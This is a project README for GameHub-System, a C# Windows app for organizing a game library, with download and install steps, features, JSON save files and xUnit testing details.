# 🎮 GameHub-System - Keep Your Game Library Organized

[![Download GameHub-System](https://img.shields.io/badge/Download-GameHub_System-2ea44f?style=for-the-badge&logo=github)](https://github.com/jauntingcargudgeonpin264/GameHub-System)

## 🚀 Getting Started

GameHub-System is a Windows app for keeping your game library in one place. It stores your data in memory while you use it, tracks achievements, logs activity, and saves your library to JSON files. It is built for people who want a simple way to manage game data on a Windows PC.

## 📥 Download

Use this link to visit the page and download the app:

[Download GameHub-System](https://github.com/jauntingcargudgeonpin264/GameHub-System)

After the page opens, look for the latest release or the main download file. Download it to your PC, then open the file to start the app.

## 🖥️ What You Need

GameHub-System runs on Windows and works best on a recent 64-bit PC.

You should have:

- Windows 10 or Windows 11
- .NET 8 runtime or a bundled app package
- At least 4 GB of RAM
- 200 MB of free disk space
- A mouse and keyboard

## 🛠️ How to Install

1. Open the download link above.
2. Find the latest release or app file.
3. Download the file to your computer.
4. If the file is a ZIP package, right-click it and choose Extract All.
5. Open the folder you extracted.
6. Double-click the app file to start it.
7. If Windows asks for permission, choose Yes.

## ▶️ How to Run

If you downloaded a single app file, do this:

1. Open the folder where the file was saved.
2. Double-click the app file.
3. Wait for the main window to open.
4. Start adding your game library.

If you downloaded a ZIP file:

1. Extract the ZIP file first.
2. Open the extracted folder.
3. Double-click the app file inside the folder.
4. Keep the folder in place so the app can save data next to it.

## 🎯 Main Features

GameHub-System includes these parts:

- Game library storage in memory
- Achievement tracking
- Telemetry for app activity
- Async JSON saving and loading
- Search and filter tools
- Game list management
- Clean data handling for fast use
- xUnit tests for core logic

## 🧩 What You Can Do

With this app, you can:

- Add games to your library
- View your saved games in one list
- Track achievements for each game
- Save your library to JSON format
- Load your library back later
- Review app activity through telemetry data
- Keep your game records in a simple structure

## 📁 Save Files

The app uses JSON files to store data. JSON is a plain text file format that keeps your game library easy to read and easy to move.

Your saved data may include:

- Game names
- Achievement status
- Telemetry records
- Library entries
- Notes and tags

Keep your save files in the same folder unless you want to move them elsewhere later.

## 🔍 How It Works

GameHub-System keeps your current game data in memory while it runs. That lets it respond fast. When you save, it writes your data to a JSON file. When you open the app again, it can load that file and restore your library.

The app also uses common C# design patterns:

- Observer pattern for updates
- Delegate pattern for actions
- LINQ for sorting and filtering

You do not need to know these terms to use the app. They help the app stay neat and responsive.

## 🧪 Testing

The project includes xUnit tests. These tests help check that the game library, achievement logic, and save features work as expected.

If you are using the app only, you do not need to run the tests.

## 🧭 Basic Use Guide

After you open the app:

1. Add a new game to your library.
2. Enter the game name and any details you want.
3. Mark achievements as complete when you finish them.
4. Save your library before closing the app.
5. Open the saved file later to load your data again.

If you keep many games in the list, use search or filters to find what you need.

## 🧰 Common Tasks

### Add a game
Enter the game title and save it in the library.

### Track an achievement
Choose the game, then mark the achievement status.

### Save your data
Use the save option to write your library to a JSON file.

### Load your data
Use the load option to bring back your saved library.

### Check activity
Open telemetry data to see app events and usage history.

## 🔒 Data Safety

Your data stays in local JSON files on your computer. This makes it simple to back up your game library. Copy the save file to a safe folder, USB drive, or cloud folder if you want an extra copy.

## 📌 Project Details

- Name: GameHub-System
- Type: Windows game library app
- Language: C#
- Runtime: .NET 8
- Storage: JSON persistence
- Testing: xUnit

## 🏷️ Topics

achievements, csharp, delegate-pattern, dotnet, game-library, json-persistence, linq, observer-pattern, telemetry, xunit